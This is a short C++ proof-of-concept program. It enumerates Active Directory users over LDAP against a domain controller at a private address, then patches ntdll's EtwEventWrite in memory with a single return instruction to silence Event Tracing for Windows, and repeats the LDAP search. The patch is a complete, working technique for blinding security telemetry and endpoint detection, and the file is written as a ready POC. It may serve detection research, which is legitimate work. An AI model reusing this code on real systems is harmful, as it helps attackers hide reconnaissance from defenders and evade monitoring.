//
// Code was created by Jonathan Johnson (@jsecurity101)
//

#include <iostream>
#include <windows.h>
#include <winldap.h>

#pragma comment(lib, "wldap32.lib")

void LdapSearch2() {
    printf("[*] Peforming LDAP search 2\n");
    LDAP* ld;
    LDAPMessage* result, * entry;
    BerElement* ber;
    PCHAR dn, attr;
    struct berval** vals;
    LPCWSTR serverAddress = L"172.31.73.13";

    // Initialize the LDAP library and connect to the server
    ld = ldap_init((PWSTR)serverAddress, LDAP_PORT);
    if (ld == NULL) {
        std::cerr << "ldap_init failed" << std::endl;
        return;
    }

    // Bind to the LDAP server (you may need to provide credentials)
    int bindResult = ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_SIMPLE);
    if (bindResult != LDAP_SUCCESS) {
        std::cerr << "ldap_bind_s failed: " << ldap_err2string(bindResult) << std::endl;
        ldap_unbind(ld);
        return;
    }

    // Specify the base DN and the filter for your query
    const char* baseDN = "dc=marvel,dc=local";
    const char* filter = "(objectClass=user)";

    // Convert baseDN and filter to wide-character strings
    wchar_t wideBaseDN[MAX_PATH];
    wchar_t wideFilter[MAX_PATH];

    if (MultiByteToWideChar(CP_UTF8, 0, baseDN, -1, wideBaseDN, MAX_PATH) == 0) {
        std::cerr << "MultiByteToWideChar conversion for baseDN failed" << std::endl;
        return;
    }

    if (MultiByteToWideChar(CP_UTF8, 0, filter, -1, wideFilter, MAX_PATH) == 0) {
        std::cerr << "MultiByteToWideChar conversion for filter failed" << std::endl;
        return;
    }

    int searchResult = ldap_search_s(ld, wideBaseDN, LDAP_SCOPE_SUBTREE, wideFilter, NULL, 0, &result);
       
    //
    // Add some code to do processing here but tbh i don't care about processing the results 
    //

    printf("[*] Ldap search 2 succeeded\n");
    ldap_msgfree(result);
    ldap_unbind(ld);
    return;

}

void LdapSearch1() {
    printf("\n[*] Peforming LDAP search 1\n");
    LDAP* ld;
    LDAPMessage* result, * entry;
    BerElement* ber;
    PCHAR dn, attr;
    struct berval** vals;


    LPCWSTR serverAddress = L"172.31.73.13";

    //
    // Initialize the LDAP library and connect to the server
    //
    ld = ldap_init((PWSTR)serverAddress, LDAP_PORT);
    if (ld == NULL) {
        std::cerr << "ldap_init failed" << std::endl;
        return;
    }

    //
    // Bind to the LDAP server (you may need to provide credentials)
    //
    int bindResult = ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_SIMPLE);
    if (bindResult != LDAP_SUCCESS) {
        std::cerr << "ldap_bind_s failed: " << ldap_err2string(bindResult) << std::endl;
        ldap_unbind(ld);
        return;
    }

    //
    // Specify the base DN and the filter for your query
    //
    const char* baseDN = "dc=marvel,dc=local";
    const char* filter = "(objectClass=person)";

    //
    // Convert baseDN and filter to wide-character strings
    //
    wchar_t wideBaseDN[MAX_PATH];
    wchar_t wideFilter[MAX_PATH];

    if (MultiByteToWideChar(CP_UTF8, 0, baseDN, -1, wideBaseDN, MAX_PATH) == 0) {
        std::cerr << "MultiByteToWideChar conversion for baseDN failed" << std::endl;
        return;
    }

    if (MultiByteToWideChar(CP_UTF8, 0, filter, -1, wideFilter, MAX_PATH) == 0) {
        std::cerr << "MultiByteToWideChar conversion for filter failed" << std::endl;
        return;
    }

   int searchResult = ldap_search_s(ld, wideBaseDN, LDAP_SCOPE_SUBTREE, wideFilter, NULL, 0, &result);


   //
   // Add some code to do processing here but tbh i don't care about doing processing here
   //

    printf("[*] Ldap search 1 succeeded\n");

    //
    // Clean up and disconnect from the LDAP server
    //
    ldap_msgfree(result);
    ldap_unbind(ld);
    return;

}

//
// Is there a safer way to patch? Probably. Does this get the job done for this POC? yes. 
//
void LDAPPatch(HMODULE hModule) {
    DWORD lpflOldProtect;
    DWORD lpfdoublelOldProtect;
    printf("[*] Patching EtwEventWrite\n");
    
    void *ldapClient = GetProcAddress(hModule, "EtwEventWrite");
    if (ldapClient == NULL) {
		printf("Failed to find EtwEventWrite\n");
		return;
	}
    
    //
    // Changing protection to PAGE_EXECUTE_READWRITE. Change 2nd value to 4 for x86
    //
    
    VirtualProtect(ldapClient, 1, PAGE_EXECUTE_READWRITE, &lpflOldProtect);

    //
    // for x86 patch EtwEventWrite by overwriting the first 4 bytes
    //
    //memcpy(ldapClient, "\xc2\x14\x00\x00", 4);

    //
    // x64 - only needs 1 bytes which is the opcode for ret
    //
    printf("[*] Patching x64\n");
    memcpy(ldapClient, "\xc3", 1);

    printf("[*] Patched EtwEventWrite\n");

    //
    // Restoring old protection. Change 2nd value to 4 for x86
    //
    VirtualProtect(ldapClient, 1, lpflOldProtect, &lpfdoublelOldProtect);
    return;
}

int main()
{
    //
    // first variable says if user wants to patch x86 or x64
    //

    HMODULE hModule = LoadLibrary(L"ntdll.dll");
    if (hModule == NULL) {
		printf("Failed to load ntdll.dll\n");
		return 1;
	}
    LdapSearch1();
    LDAPPatch(hModule);
    LdapSearch2();

    return 0; 

}
